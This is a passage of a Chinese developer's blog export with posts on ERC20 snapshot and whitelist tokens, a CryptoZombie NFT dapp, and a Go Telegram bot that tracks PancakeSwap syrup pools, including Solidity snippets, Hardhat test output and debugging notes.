<p>代币发生转移时，以当前区块数做快照id,记录发生转移前的用户余额或代币供应量。</p>
<h1>部署：</h1>
<p>无</p>
<h1>编写合约：</h1>
<h2 id="自定义快照策略：">自定义快照策略：</h2>
<p>注释里有提到要怎么修改:</p>
<blockquote>
<p>可以通过覆盖<code>&#123;_getCurrentSnapshotId&#125;</code> 方法来自定义快照策略。</p>
<p>例如，return <code>block.number</code> ,将在每个新块的开头触发创建快照。当覆盖这个函数，注意其结果的单调性（需要单增）。非单调的快照 id 会破坏合约。</p>
</blockquote>
<p><code>ERC20Snapshot</code>源码里的快照id原本是一个计数器，该计数器只能+1,-1这样去操作。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ERC20Snapshot源码</span></span><br><span class="line"><span class="title class_">Counters</span>.<span class="property">Counter</span> private _currentSnapshotId;</span><br></pre></td></tr></table></figure>
<p>如果要用当前区块数做快照id,那就要重写该变量，并且重写与该变量有关的两个函数：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>function _snapshot() internal virtual returns (uint256) &#123;&#125;</code></p>
</li>
<li class="lvl-2">
<p><code> function _getCurrentSnapshotId() internal view virtual returns (uint256) &#123;&#125;</code></p>
</li>
</ul>
<p>从而自己去管理这个快照id</p>
<p>还要注意<code>_updateSnapshot（）</code>函数里，有个触发快照的判断条件</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_">_lastSnapshotId</span>(snapshots.<span class="property">ids</span>) &lt; currentId) &#123; <span class="comment">// 触发快照的条件：当前id要比上一次存储的id大</span></span><br><span class="line">        snapshots.<span class="property">ids</span>.<span class="title function_">push</span>(currentId);</span><br><span class="line">        snapshots.<span class="property">values</span>.<span class="title function_">push</span>(currentValue);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>在测试几次后，发现要在构造器里初始化<code>_currentSnapshotId</code>才行，不然这个<code>_currentSnapshotId</code>一直为0，一直过不了这个判断条件，不执行快照。</p>
<p>在实现的时候，还被<code>private</code>修饰符搞得很晕。。。<code>私有变量</code>不能直接在子类访问或修改，只能通过调用父类的函数去访问或修改，或者该变量相关的定义和函数都自己重写覆盖掉（我采用的是后者）</p>
<blockquote>
<p>tips: 理解清楚<code>private</code>，<code>internal</code>,<code>virtual</code>这几个修饰符后，才能更好的写出面向对象的。。精简的代码。。</p>
</blockquote>
<h1>测试：</h1>
<h2 id="Remix">Remix:</h2>
<p>先在remix简单测试，由于继承了父类的一些方法，用<code>console.log</code>去Debug，易于知道自己的方法在什么时候能够调用到</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;hardhat/console.sol&quot;</span>;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220621101109.png" alt="20220621101109" /></p>
<h2 id="hardhat">hardhat:</h2>
<h3 id="获取tx详情">获取tx详情:</h3>
<p>在<code>hardhat</code>自带环境，不用像测试网那样要wait,可直接获得被确认后的tx详情</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">tx = <span class="keyword">await</span> tokenOwner.<span class="property">Token</span>.<span class="title function_">transfer</span>(users[<span class="number">0</span>].<span class="property">address</span>, amountWei1);</span><br><span class="line"><span class="comment">// console.log(tx)  不用wait,该tx就是被确认的tx</span></span><br></pre></td></tr></table></figure>
<h3 id="trick：">trick：</h3>
<p>如果是使用hardhat环境，修改代码后不需要再编译、部署，直接运行<code> yarn hardhat test</code>，就可以使用新代码</p>
<h3 id="测试结果：-4">测试结果：</h3>
<p>符合预期</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">  Token contract</span><br><span class="line">    Transactions</span><br><span class="line"> Before Transfer: </span><br><span class="line">【Step 1】tokenOwnerBalance(Ether): 1000.0</span><br><span class="line">【Step 1】userBalance(Ether): 0.0</span><br><span class="line"> Transfer: </span><br><span class="line">【Step 2】tokenOwner -&gt; 100-&gt; user0: </span><br><span class="line">【Step 2】blockNum When tx confirmed: 2</span><br><span class="line">【Step 2】tokenOwnerBalance(Ether): 900.0</span><br><span class="line">【Step 2】userBalance(Ether): 100.0</span><br><span class="line"> Check Snapshot: </span><br><span class="line">【Step 3】tokenOwnerBalance(Ether) AtSnapshot: 1000.0  BlockNum :2</span><br><span class="line">【Step 3】userBalance(Ether) AtSnapshot: 0.0  BlockNum :2</span><br><span class="line"> Transfer again: </span><br><span class="line">【Step 4】tokenOwner -&gt; 100-&gt; user0: </span><br><span class="line">【Step 4】blockNum When tx confirmed: 3</span><br><span class="line">【Step 4】tokenOwnerBalance(Ether): 800.0</span><br><span class="line">【Step 4】userBalance(Ether): 200.0</span><br><span class="line"> Check Snapshot: </span><br><span class="line">【Step 5】tokenOwnerBalance(Ether) AtSnapshot: 900.0  BlockNum :3</span><br><span class="line">【Step 5】userBalance(Ether) AtSnapshot: 100.0  BlockNum :3</span><br><span class="line">      ✔ Check snapshotId和<span class="built_in">users</span> balance (1468ms)</span><br><span class="line">    Burn</span><br><span class="line"> Before burn : </span><br><span class="line">【Step 1】tokenOwnerBalance(Ether): 1000.0</span><br><span class="line">【Step 1】totalSupplyWeiBefore(Ether): 1000.0</span><br><span class="line"> tokenOwner Burn 100Ether token: </span><br><span class="line">【Step 2】blockNum When tx confirmed: 2</span><br><span class="line">【Step 2】tokenOwnerBalanceWei(Ether): 900.0</span><br><span class="line">【Step 2】totalSupplyWei(Ether): 900.0</span><br><span class="line"> Check Snapshot: </span><br><span class="line">【Step 3】tokenOwnerBalance(Ether) AtSnapshot: 1000.0  BlockNum :2</span><br><span class="line">【Step 3】totalSupply(Ether) AtSnapshot: 1000.0  BlockNum :2</span><br><span class="line"> tokenOwner Burn 100Ether token Again: </span><br><span class="line">【Step 4】blockNum When tx confirmed: 3</span><br><span class="line">【Step 4】tokenOwnerBalanceWei(Ether): 800.0</span><br><span class="line">【Step 4】totalSupplyWei(Ether): 800.0</span><br><span class="line"> Check Snapshot Again: </span><br><span class="line">【Step 5】tokenOwnerBalance(Ether) AtSnapshot: 900.0  BlockNum :3</span><br><span class="line">【Step 5】totalSupply(Ether) AtSnapshot: 900.0  BlockNum :3</span><br><span class="line">      ✔ Burn, check Snapshot totalsupply (241ms)</span><br><span class="line"></span><br><span class="line">  2 passing (2s)</span><br><span class="line"></span><br><span class="line">✨  Done <span class="keyword">in</span> 9.05s.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1>Summary:</h1>
<ol>
<li class="lvl-3">
<p>阅读源码技巧：<code>Slither</code>输出继承关系图，还差一个能输出<code>函数互相调用</code>的图的工具。</p>
</li>
<li class="lvl-3">
<p>加深对<code>solidity</code>继承这一块的理解，理解清楚<code>private</code>，<code>internal</code>,<code>virtual</code>等修饰符，才能更好的写出面向对象的精简的代码。。目前这一块还是有点晕😓</p>
</li>
<li class="lvl-3">
<p>多看如<code>openzeppelin</code>这类优秀的源码库，可以学到很多优秀的代码实现，且少写很多代码</p>
</li>
</ol>
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/README.adoc">https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/README.adoc</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Project</category>
      </categories>
      <tags>
        <tag>SmartContract</tag>
        <tag>Project</tag>
        <tag>CoolErc20</tag>
      </tags>
  </entry>
  <entry>
    <title>Project-CoolErc20-whitelist-具备白名单代币</title>
    <url>/2022/30342.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>实现一个具有白名单功能的erc20代币<br />
github仓库地址: <code>https://github.com/jerrychan807/cool-erc20/tree/main/whitelist</code></p>
<h1>需求:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>白名单用户才能正常<code>transfer</code></p>
</li>
<li class="lvl-2">
<p>管理员可配置白名单里的地址</p>
</li>
</ul>
<h1>业务场景：</h1>
<p>给白名单用户提供一些优惠的条件</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>降低手续费、费率优惠</p>
</li>
<li class="lvl-2">
<p>设置某个区块时间内，只有白名单可以交易</p>
</li>
</ul>
<p>不一定将白名单判断置于<code>transfer</code>的逻辑里，基于需求可以置于铸币、初始销售ido等流程里</p>
<p>但白名单有点非黑即白的感觉，如果遇到多级营销分红的场景，可能不太适用，需要使用贴合场景的数据结构。</p>
<h1>部署：</h1>
<p>无</p>
<h1>编写合约：</h1>
<h2 id="白名单初始化：">白名单初始化：</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 构造函数</span><br><span class="line">constructor() public ERC20(&quot;JToken&quot;, &quot;JToken&quot;) &#123;</span><br><span class="line">    _mint(msg.sender, _totalSupply);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由于一开始需要铸币给管理员地址，所以需要提前把管理员的地址加入白名单（看白名单具体的判定条件，可能<code>0x00</code>地址也需要加入白名单），不然deploy就会失败。</p>
<h1>测试：</h1>
<h2 id="revert：">revert：</h2>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 正确写法</span></span><br><span class="line"><span class="keyword">await</span> <span class="title function_">expect</span>(users[<span class="number">0</span>].<span class="property">Token</span>.<span class="title function_">transfer</span>(users[<span class="number">1</span>].<span class="property">address</span>, amountWei)).<span class="property">to</span>.<span class="property">be</span>.<span class="property">reverted</span>;</span><br><span class="line"><span class="comment">// 错误写法</span></span><br><span class="line">expect <span class="title function_">await</span>(users[<span class="number">0</span>].<span class="property">Token</span>.<span class="title function_">transfer</span>(users[<span class="number">1</span>].<span class="property">address</span>, amountWei)).<span class="property">to</span>.<span class="property">be</span>.<span class="property">reverted</span>;</span><br></pre></td></tr></table></figure>
<p>多查文档:<a href="https://ethereum-waffle.readthedocs.io/en/latest/matchers.html">Chai matchers</a></p>
<h2 id="测试结果：-5">测试结果：</h2>
<p>符合预期：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">   Token contract</span><br><span class="line">    Transfer</span><br><span class="line"> Before Transfer: </span><br><span class="line">【Step 1】tokenOwnerBalance(Ether): 1000.0</span><br><span class="line">【Step 1】userBalance(Ether): 0.0</span><br><span class="line"> Transfer: </span><br><span class="line">【Step 2】tokenOwner -&gt; 100 -&gt; user0: </span><br><span class="line">【Step 2】tokenOwnerBalance(Ether): 900.0</span><br><span class="line">【Step 2】userBalance(Ether): 100.0</span><br><span class="line"> Transfer: user0 -&gt; 100-&gt; user1</span><br><span class="line">【Step 3】user0 -&gt; 100-&gt; user1 to be reverted</span><br><span class="line"> Set whiteList: </span><br><span class="line">【Step 4】tokenOwner Set user0 in WhiteList: </span><br><span class="line">【Step 4】user0IfwhiteList: true</span><br><span class="line"> After setting whitelist, try to transfer: </span><br><span class="line">【Step 5】 expect : users[0] -&gt; 100-&gt; user1 to be not reverted</span><br><span class="line">【Step 5】user0Balance(Ether): 0.0</span><br><span class="line">【Step 5】user1Balance(Ether): 100.0</span><br><span class="line">      ✔ only transfer after setting whiteList (1253ms)</span><br><span class="line"></span><br><span class="line">  1 passing (1s)</span><br></pre></td></tr></table></figure>
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://ethereum-waffle.readthedocs.io/en/latest/matchers.html">Chai matchers</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Project</category>
      </categories>
      <tags>
        <tag>SmartContract</tag>
        <tag>Project</tag>
        <tag>CoolErc20</tag>
      </tags>
  </entry>
  <entry>
    <title>Project-CryptoZombie僵尸世界NFT游戏</title>
    <url>/2021/60348.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>在做完<a href="https://cryptozombies.io/zh/course">僵尸教程</a>后，觉得很不错，所以想从头写一遍，写一个dapp练练手。<br />
前端用vue，合约用solidity，部署到<code>goerli</code>测试网</p>
<h1>在线Demo:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://zommbie-gamma.vercel.app/preview">crypto-zombie-website</a> :<code>https://zommbie-gamma.vercel.app/preview</code></p>
</li>
<li class="lvl-2">
<p><a href="https://goerli.etherscan.io/address/0x81abd043aaea6d27b75b07d4445cfe35688b3694#code">ContractSourceCode</a> : <a href="https://goerli.etherscan.io/address/0x81abd043aaea6d27b75b07d4445cfe35688b3694#code">https://goerli.etherscan.io/address/0x81abd043aaea6d27b75b07d4445cfe35688b3694#code</a></p>
</li>
</ul>
<p>需要使用Chrome浏览器和Metamask钱包插件,连接<code>goerli</code>测试网</p>
<table>
<thead>
<tr>
<th>RPC</th>
<th>Chain ID</th>
<th>browser</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="https://goerli.infura.io/v3/">https://goerli.infura.io/v3/</a></td>
<td>5</td>
<td><a href="https://goerli.etherscan.io">https://goerli.etherscan.io</a></td>
</tr>
</tbody>
</table>
<h1>效果图:</h1>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211129150336.png" alt="20211129150336" /></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211129150410.png" alt="20211129150410" /></p>
<h1>测试流程:</h1>
<ol>
<li class="lvl-3">
<p>在remix编写solidity</p>
</li>
<li class="lvl-3">
<p>在remix直接部署合约到<code>JavaScript VM</code>，把要用到函数走一遍流程</p>
</li>
<li class="lvl-3">
<p>truffle部署到ropsten测试网</p>
</li>
<li class="lvl-3">
<p>vue编写代码调试，与合约交互</p>
</li>
</ol>
<h1>部署:</h1>
<p>执行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">truffle migrate --network ropsten</span><br></pre></td></tr></table></figure>
<p>即可部署至Ropsten</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20211129152415.png" alt="20211129152415" /></p>
<p>部署完毕后，把json文件copy到前端里面，在代码实例化后就可以直接使用了。</p>
<h1>Bug:</h1>
<p>把遇到的bug列一下</p>
<h2 id="truffle初始化错误">truffle初始化错误:</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">truffle init</span><br></pre></td></tr></table></figure>
<p>直接用上面的命令去初始化truffle项目时，可能遇到网络问题等原因，无法直接初始化，可以去github下载<br />
<code>git clone https://github.com/truffle-box/bare-box</code></p>
<h2 id="truffle部署合约">truffle部署合约:</h2>
<p>部署到测试网时，<code>truffle migrate --network ropsten</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 报错</span><br><span class="line">Error: Cannot find module &#x27;@truffle/hdwallet-provider&#x27;</span><br></pre></td></tr></table></figure>
<p>解决办法： <code>npm install @truffle/hdwallet-provider</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 报错</span><br><span class="line">Error encountered, bailing. Network state unknown. Review successful transactions manually.</span><br><span class="line">insufficient funds for gas * price + value</span><br></pre></td></tr></table></figure>
<p>解决办法：要确保助记词和钱包对应得上,且钱包里有足够的Ether</p>
<h1>语法:</h1>
<p>把遇到的一些语法问题列一下</p>
<h2 id="pure-vs-view">pure vs view:</h2>
<p>pure比view更加严格</p>
<p><code>view</code>读取存储，但不会修改</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract viewExample &#123;</span><br><span class="line"></span><br><span class="line">    string state;</span><br><span class="line"></span><br><span class="line">    // other contract functions</span><br><span class="line"></span><br><span class="line">    function viewState() public view returns(string) &#123;</span><br><span class="line">        //read the contract storage </span><br><span class="line">        return state;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>pure</code>可以被认为是返回值仅由它的参数（输入值）确定的子集。不会对存储进行读写操作，只会使用局部变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract pureExample &#123;</span><br><span class="line"></span><br><span class="line">    // other contract functions</span><br><span class="line"></span><br><span class="line">    function pureComputation(uint para1 , uint para2) public pure returns(uint result) &#123;</span><br><span class="line">        // do whatever with para1 and para2 and assign to result as below</span><br><span class="line">        result = para1 + para2;</span><br><span class="line">        return  result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><a href="https://ethereum.stackexchange.com/questions/28898/when-to-use-view-and-pure-in-place-of-constant">When to use “View” and “Pure” in place of “Constant”</a></p>
<h2 id="external-vs-public">external vs public:</h2>
<p>public - all can access</p>
<p>external - Cannot be accessed internally, only externally</p>
<p>internal - only this contract and contracts deriving from it can access</p>
<p>private - can be accessed only from this contract</p>
<p><a href="https://ethereum.stackexchange.com/questions/19380/external-vs-public-best-practices"><code>external</code> vs <code>public</code> best practices</a></p>
<h2 id="array删除">array删除:</h2>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">uint[] assets;</span><br><span class="line"><span class="title function_">mapping</span>(<span class="function"><span class="params">uint</span>=&gt;</span>uint) indexOfAsset;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">removeAssetFromArray</span>(<span class="params">uint _assetToDelete</span>) &#123;</span><br><span class="line">  uint index = indexOfAsset[_assetToDelete];</span><br><span class="line">  <span class="keyword">if</span> (!index) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (assets.<span class="property">length</span> &gt; <span class="number">1</span>) &#123; <span class="comment">// 把最后一项移到你需要删除的位置，进行覆盖</span></span><br><span class="line">    assets[index] = assets[assets.<span class="property">length</span>-<span class="number">1</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  assets.<span class="property">length</span>--; <span class="comment">// Implicitly recovers gas from last element storage</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><a href="https://ethereum.stackexchange.com/questions/35790/efficient-approach-to-delete-element-from-array-in-solidity/41025">Efficient approach to delete element from array in Solidity</a></p>
<h2 id="invalid-opcode-“0xfe”">invalid opcode “0xfe”:</h2>
<p>合约数组可能有越界访问的问题，这个时候多去remix把操作流程仔细走一遍，看看调用哪个函数会出错。</p>
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://learnblockchain.cn/2019/12/20/vue-dapp">【教程】如何使用Vue.js 开发以太坊DApp</a></p>
</li>
<li class="lvl-2">
<p><a href="https://naruto-1996.github.io/2021/03/19/eth-zhi-neng-he-yue-kai-fa/">ETH智能合约开发(vue + 智能合约)</a></p>
</li>
<li class="lvl-2">
<p><a href="https://npm.io/package/zombie-char-component">zombie-char-component v1.0.7</a></p>
</li>
<li class="lvl-2">
<p><a href="https://github.com/onee-io/crypto-zombies">https://github.com/onee-io/crypto-zombies</a></p>
</li>
<li class="lvl-2">
<p><a href="https://github.com/Fankouzu/smart-contract/blob/master/Solidity%20Lesson%2004/contracts/zombieCore.sol">https://github.com/Fankouzu/smart-contract/blob/master/Solidity Lesson 04/contracts/zombieCore.sol</a></p>
</li>
<li class="lvl-2">
<p><a href="https://fankouzu.github.io/my-crypto-zombie/?MyZombie">https://fankouzu.github.io/my-crypto-zombie/?MyZombie</a></p>
</li>
<li class="lvl-2">
<p><a href="https://code.z01.com/bootstrap-vue/docs/components/card.html">https://code.z01.com/bootstrap-vue/docs/components/card.html</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Project</category>
      </categories>
      <tags>
        <tag>SmartContract</tag>
        <tag>Solidity</tag>
        <tag>Project</tag>
      </tags>
  </entry>
  <entry>
    <title>Project-LifeHack_Golang_HKbet_Newspaper_Email_Sender开发过程(Encrypted)</title>
    <url>/2022/31912.html</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="67d7a939327fecc53326001644fbe1b066dfd6f08a8f911344b9665d77f6f737"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Welcome to my blog, enter password to read.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Project</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title>Project-cake-syrup-pools-lover-PancakeSwap糖浆池TgBot-开发记录</title>
    <url>/2022/20047.html</url>
    <content><![CDATA[<h1>引言:</h1>
<p>需求:</p>
<ol>
<li class="lvl-3">
<p>持仓cake成本较高,现在不想割掉，利用糖浆池白嫖，加快回本周期。<br />
原来的<code>Stake Cake Earn Cake</code>糖浆池更新后，增加了锁仓期，不太喜欢。<br />
<code>PancakeSwap</code>周期性会上新币，糖浆池挖矿会有bonus期,头几天可以有不错的收益。</p>
</li>
<li class="lvl-3">
<p>后期计划开发个Bot,在链下自动化将cake投入apr最高的糖浆池中,定期执行挖提卖策略.</p>
</li>
<li class="lvl-3">
<p>后期计划开发理财机枪池dapp,此部分可作为链下策略逻辑,feed给SmartContract。</p>
</li>
<li class="lvl-3">
<p>practice go language</p>
</li>
</ol>
<blockquote>
<p>先手工测测收益如何?</p>
</blockquote>
<h1>简单实测收益:</h1>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">2022/08/05 07:56:08 stake 100Cake 372.59$</span><br><span class="line">2022/08/07 09:57:00 新糖浆池挖提卖 4.57$</span><br></pre></td></tr></table></figure>
<p>1000cake的话,头2天可以白嫖45.7u,大约11个cake,几顿猪脚饭钱</p>
<blockquote>
<p>收益会比<code>Stake Cake Earn Cake</code>糖浆池强,还不用锁仓</p>
</blockquote>
<h1>Bot功能简介:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>Github源码: <a href="https://github.com/jerrychan807/cake-syrup-pools-lover">https://github.com/jerrychan807/cake-syrup-pools-lover</a></p>
</li>
<li class="lvl-2">
<p>TgBot链接: <a href="https://t.me/J_bsc_bot">https://t.me/J_bsc_bot</a></p>
</li>
</ul>
<h2 id="命令菜单">命令菜单:</h2>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220826162537.png" alt="20220826162537" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/syrup_pools_pie <span class="comment"># 糖浆池日收益的饼状图 Syrup Pool Daily Pie Chart</span></span><br><span class="line">/syrup_pools_table <span class="comment"># 糖浆池完整信息的表格图 Syrup Pool Infos Table Chart</span></span><br><span class="line">/syrup_pools_full <span class="comment"># 查询最新糖浆池信息(每10分钟更新一次) Query SyrupPool infos(updated per10mins)</span></span><br><span class="line">/subscribe_syrup_pool <span class="comment"># 订阅糖浆池新池提醒 Subscribe to New Syrup Pool Alerts</span></span><br><span class="line">/subscribe_result <span class="comment"># 查询是否订阅成功 Check Subscription Status</span></span><br><span class="line">/subscribe_nums <span class="comment"># 查询订阅人数 Check Subscription nums</span></span><br></pre></td></tr></table></figure>
<h2 id="订阅新糖浆池通知">订阅新糖浆池通知:</h2>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220826162704.png" alt="20220826162704" /><br />
订阅后,如果上了<code>PancakeSwap</code>上了新的糖浆池,会推送消息给你的Tg.<br />
新池越早冲,收益越高.</p>
<h2 id="查询糖浆池日收益的饼状图">查询糖浆池日收益的饼状图:</h2>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220826162807.png" alt="20220826162807" /></p>
<h2 id="查询糖浆池完整信息的表格图">查询糖浆池完整信息的表格图:</h2>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220826163247.png" alt="20220826163247" /></p>
<h2 id="查询最新糖浆池信息">查询最新糖浆池信息:</h2>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220826163351.png" alt="20220826163351" /><br />
其中我认为比较实用的信息是,计算出 每100cake 每日/周/月/年对应的usd收益<br />
类似该工具网站<a href="https://bsctools.xyz/pancakeswap/pools/">bsctools</a>:<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220821164116.png" alt="20220821164116" /></p>
<h1>程序流程:</h1>
<ol>
<li class="lvl-3">
<p>获取pancake github上的<a href="https://raw.githubusercontent.com/pancakeswap/pancake-frontend/develop/src/config/constants/pools.tsx">糖浆池配置列表</a></p>
</li>
<li class="lvl-3">
<p>解析糖浆池配置列表,获取SyrupPool数组</p>
</li>
<li class="lvl-3">
<p>生成此次糖浆池配置信息的MD5哈希值</p>
</li>
<li class="lvl-3">
<p>比较与上次的md5,判断有无新池</p>
</li>
<li class="lvl-3">
<p>填充糖浆池detail信息,如计算出<code>每日/周/月/年对应的usd收益</code>等</p>
</li>
<li class="lvl-3">
<p>更新数据库里的糖浆池信息</p>
</li>
<li class="lvl-3">
<p>生成糖浆池日收益的饼状图和完整信息的表格图</p>
</li>
<li class="lvl-3">
<p>如果出现新池,推送给订阅的tg用户</p>
</li>
</ol>
<blockquote>
<p>下面记录一下,一些模块的实现方法和实际开发过程中遇到的一些问题</p>
</blockquote>
<h1>功能的具体实现:</h1>
<h2 id="获取糖浆池列表信息">获取糖浆池列表信息:</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 获取到的是GitHub返回的html页面</span></span><br><span class="line">https://github.com/pancakeswap/pancake-frontend/blob/develop/src/config/constants/pools.tsx</span><br><span class="line"><span class="comment"># 源文件,要用这个url</span></span><br><span class="line">https://raw.githubusercontent.com/pancakeswap/pancake-frontend/develop/src/config/constants/pools.tsx</span><br></pre></td></tr></table></figure>
<p>需要获取的数据:<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220817095033.png" alt="20220817095033" /></p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   <span class="attr">sousId</span>: <span class="number">291</span>,    <span class="comment">// 应该是糖浆池id</span></span><br><span class="line">   <span class="attr">stakingToken</span>: serializedTokens.<span class="property">cake</span>,  <span class="comment">// 这个是统一的,质押用的token都用的是cake</span></span><br><span class="line">   <span class="attr">earningToken</span>: serializedTokens.<span class="property">pstake</span>, <span class="comment">// 挖出的XToken项目方代币</span></span><br><span class="line">   <span class="attr">contractAddress</span>: &#123;</span><br><span class="line">     <span class="number">56</span>: <span class="string">&#x27;0x56D6955Ba6404647191DD7A5D65A5c9Fe43905e1&#x27;</span>, <span class="comment">// bsc上的合约地址</span></span><br><span class="line">     <span class="number">97</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">   &#125;,</span><br><span class="line">   <span class="attr">poolCategory</span>: <span class="title class_">PoolCategory</span>.<span class="property">CORE</span>, </span><br><span class="line">   <span class="attr">tokenPerBlock</span>: <span class="string">&#x27;1.1574&#x27;</span>, <span class="comment">// 每区块奖励的XToken数量</span></span><br><span class="line">   <span class="attr">version</span>: <span class="number">3</span>,</span><br><span class="line"> &#125;,</span><br></pre></td></tr></table></figure>
<p>思路1:<br />
使用<a href="https://github.com/dop251/goja">goja</a>里的JavaScript 虚拟机直接解析js/ts文件,直接获取到需要的变量值.<br />
但可能是不支持<code>tsx</code>文件的解析,使用<code>goja</code>库解析时会报错.<br />
example: <a href="https://www.ohyee.cc/post/note_go_js">在 Go 中运行 JS 代码</a></p>
<p>思路2:<br />
将原数据填充成标准的json格式,然后<code>json-&gt; go struct</code></p>
<p>思路3:<br />
任何文本处理都可以使用正则匹配来解决,最后还是采取这种古老的方法.</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220817093337.png" alt="20220817093337" /></p>
<h2 id="监测pools-tsx变更">监测pools.tsx变更:</h2>
<p>思路1:<br />
订阅commit事件,第一时间可以知道上新的糖浆池了<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220817095512.png" alt="20220817095512" /><br />
思路2:<br />
定时获取,md5比较</p>
<h2 id="查询Token价格">查询Token价格:</h2>
<p>思路1:通过pancake的api获取到价格<br />
优缺点:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>优点: 方便</p>
</li>
<li class="lvl-2">
<p>缺点: 中心化api可能会挂,虽然几率较小,这不好说</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">https://api.pancakeswap.info/api/v2/tokens/0x734548a9e43d2D564600b1B2ed5bE9C2b911c6aB</span><br><span class="line">Or</span><br><span class="line">https://bsctools.xyz/pancakeswap/api/price.php</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220821165255.png" alt="20220821165255" /><br />
思路2:自己通过查询合约计算出来<br />
参考<a href="https://gist.github.com/Linch1/ede03999f483f2b1d5fcac9e8b312f2c">Retrive the price of any bsc token from it’s address without using external service like poocoin/dextools</a>,计算方法如下：</p>
<ol>
<li class="lvl-3">
<p>计算BNB价格usd,调用<code>PancakeSwap</code>的<code>Router</code>合约的<code>getAmountsOut</code>方法,看一个<code>BNB</code>可以获得多少<code>USDT</code></p>
</li>
<li class="lvl-3">
<p>同理,继续调用<code>getAmountsOut</code>方法，看一个<code>shitToken</code>可以获得多少<code>BNB</code></p>
</li>
<li class="lvl-3">
<p>已知BNB的美元价格,<code>shitToken</code>和<code>BNB</code>的比例关系,就可以计算出<code>shitToken</code>的美元价格了</p>
</li>
</ol>
<p>优缺点:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>优点: 可作为备用方法、更通用一些,可迁移到如以太坊的uniswap上</p>
</li>
<li class="lvl-2">
<p>缺点: 步骤较麻烦一些</p>
</li>
</ul>
<blockquote>
